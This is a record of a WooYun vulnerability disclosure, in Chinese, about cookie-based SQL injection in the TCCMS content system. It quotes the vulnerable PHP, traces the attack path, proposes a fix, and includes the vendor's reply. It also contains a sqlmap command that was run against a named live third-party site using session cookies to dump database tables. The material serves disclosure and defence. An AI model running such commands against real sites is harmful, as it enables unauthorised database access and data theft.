{"id": 6351, "wybug_id": "wooyun-2013-041200", "wybug_title": "TCCMS全版本COOKIE注入（已演示证明）", "wybug_corp": "teamcen.com", "wybug_author": "lxj616", "wybug_date": "2013-11-01 11:06", "wybug_open_date": "2014-01-30 11:07", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-04：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-12-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-01-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-01-30：\t细节向公众公开  简要描述： TCCMS  teamcen.com  Cookie Injection具体请见详细说明证明处使用SQLMAP注射成功 详细说明：  /public/Class/Authen.class.php省略无关代码请注意添加注释处代码，下同\npublic static function checkUserLogin() {        $_Obj = M(\"user\");        if (empty($_COOKIE['userId']) || empty($_COOKIE['AuthenId'])) {return false;}        //下面的语句直接使用$_COOKIE['userId']没有过滤        $sql=\"select password from \".$_Obj->table.\" where id=\".$_COOKIE['userId'];        //不考虑之后的代码，如果没有其他限制至少可以盲注        $info = $_Obj->query($sql);        if (!empty($_COOKIE['AuthenId']) && md5($info[0][password].Config::get(\"anthenKey\")) == $_COOKIE['AuthenId']) {            return true;        }        return false;    }//下面函数与之后提到的攻击向量有关public static function checkIsSelfData($uid) {    \tif (self::isAdmin()) {return true;}    \tif ($uid == $_COOKIE['userId'] && self::checkUserLogin()) {return true;}    \treturn false;    }\n那么我们要定位漏洞代码的触发位置/core/controller/user.class.php攻击向量：update()-------------》Authen::checkIsSelfData-------》checkUserLogin()缺陷参数：userID\npublic function update() {\t\t…………省略无关代码…………\t\t//禁止修改别人的\t\t$IsSelfData = Authen::checkIsSelfData($_Obj->id);\t\tif (!$IsSelfData) {\t\t\t$this->setValue(\"error\", Config::lang(\"NOTRIGHT\"));\t\t\t$this->forward(\"error.html\");\t\t\texit;\t\t}\t\t$_Obj->update();\t\tStringUtil::msgbox(Config::lang(\"MODIFYSUCCESS\"), 'index.php?ac=user_info', 1);\t}\n即：在更新个人信息时可以直接将cookie中的userID带入数据库查询，形成注射下面是利用SQLMAP的证明   漏洞证明：  演示的站点为  lszq.xinwen110.cn理事会员-中国社会新闻网理事会员-中国社会新闻网 - Power  By TCCMS本机测试时的命令\nC:\\Users\\Administrator.PC-20110802HBAF>sqlmap.py -u \"lszq.xinwen110.cn/index.php?ac=user_update\" --data \"abc\" --cookie \"Cookie=PHPSESSID=0lc04nmbqmmtr420c83n8ov3g4; userId=37; AuthenId=2fd1239168e9fabd621a8d00fba03203\" --level 2 --table --dbms=mysql\n\n\n跑了下数据库，证明即可\n\n注意，请在复现漏洞时将COOKIE换为对应的有效COOKIE（可以注册一个）   修复方案：  checkUserLogin() 严格过滤userID   版权声明：转载请注明来源 lxj616@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2013-11-01 13:20 厂商回复： 感谢乌云感谢lxj616对TCCMS开源产品的检测，已经进行了修复。CODE：/public/Class/Authen.class.php、checkUserLogin();intval($_COOKIE['userId']); 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-03 22:40 |    \t\t0c0c0f \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:15        | My H34rt c4n 3xploit 4ny h0les!)\t\t \n  @sxj616 请问cookie里面的userId sqlmap怎么不会测试bool 形式 盲注？我用sqlmap没跑出来    \n     2015-07-04 08:46 |    \t\tlxj616 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:90        | <hohoho>)\t\t \n  @0c0c0f 1.cookie要换成你自己的cookie，不要用我自己的cookie（已经失效）2.目前该漏洞已经修补，如果你只是复制粘贴我的sqlmap语句，应该是不行的，需要找到老版本TCCMS源代码测试    \n     2015-07-04 10:11 |    \t\t0c0c0f \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:15        | My H34rt c4n 3xploit 4ny h0les!)\t\t \n   @lxj616 我修改了代码进行的测试，cookie也是最新的。     \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}